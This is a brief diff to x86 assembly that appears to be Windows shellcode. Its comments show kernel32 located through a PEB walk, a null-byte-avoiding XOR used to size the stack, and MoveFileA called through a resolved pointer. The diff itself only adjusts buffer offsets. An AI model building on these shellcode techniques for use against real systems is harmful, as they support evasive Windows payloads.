@@ -137,7 +137,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -213,9 +213,9 @@ wf_hang_1:
 wf_entry:
 
     ; MoveFileA(lpExistingFileName, lpNewFileName)
-    lea  eax, [ebp-0x9c]
+    lea  eax, [ebp-0x11c]
     push eax                      ; lpNewFileName
-    lea  eax, [ebp-0x90]
+    lea  eax, [ebp-0x110]
     push eax                      ; lpExistingFileName
     call dword ptr [ebp-0x24]
     mov  [ebp-0x2c], eax
